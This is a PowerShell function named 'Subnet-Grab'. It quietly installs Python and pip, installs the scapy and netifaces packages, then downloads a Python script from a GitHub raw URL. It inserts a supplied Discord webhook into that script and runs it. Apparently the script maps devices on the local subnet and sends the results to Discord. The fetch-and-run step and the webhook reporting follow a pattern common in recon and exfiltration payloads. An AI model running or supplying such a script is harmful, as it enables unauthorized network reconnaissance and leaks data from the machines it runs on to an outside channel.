function Subnet-Grab {
    param (
        [string]$discordWebhook
    )
    
    # Check if Python is installed
    if (-not (Test-Path (Join-Path $env:SYSTEMROOT "py.exe"))) {
        Write-Host "Python is not installed. Installing Python..."
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe" -OutFile "python_installer.exe"
        Start-Process -Wait -FilePath "python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1"
        Remove-Item "python_installer.exe"
    } else {
        Write-Host "Python is already installed."
    }
    
    # Check if pip is installed
    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA "Programs/Python/Python39/Scripts/pip.exe"))) {
        Write-Host "Pip is not installed. Installing Pip..."
        Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "get-pip.py"
        py.exe get-pip.py
        Remove-Item "get-pip.py"
    } else {
        Write-Host "Pip is already installed."
    }
    
    # Install required Python packages
    py.exe -m pip install scapy netifaces
    
    # Download and modify the Python script
    $pythonScript = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py" | Select-Object -ExpandProperty Content
    $pythonScript = $pythonScript -replace "YOUR DISCORD WEBHOOK HERE", $discordWebhook
    Set-Content -Path "SubnetGrab.py" -Value $pythonScript
    
    # Execute the Python script
    py.exe SubnetGrab.py
}

# Example function call
#Subnet-Grab -discordWebhook "YOUR DISCORD WEBHOOK HERE"
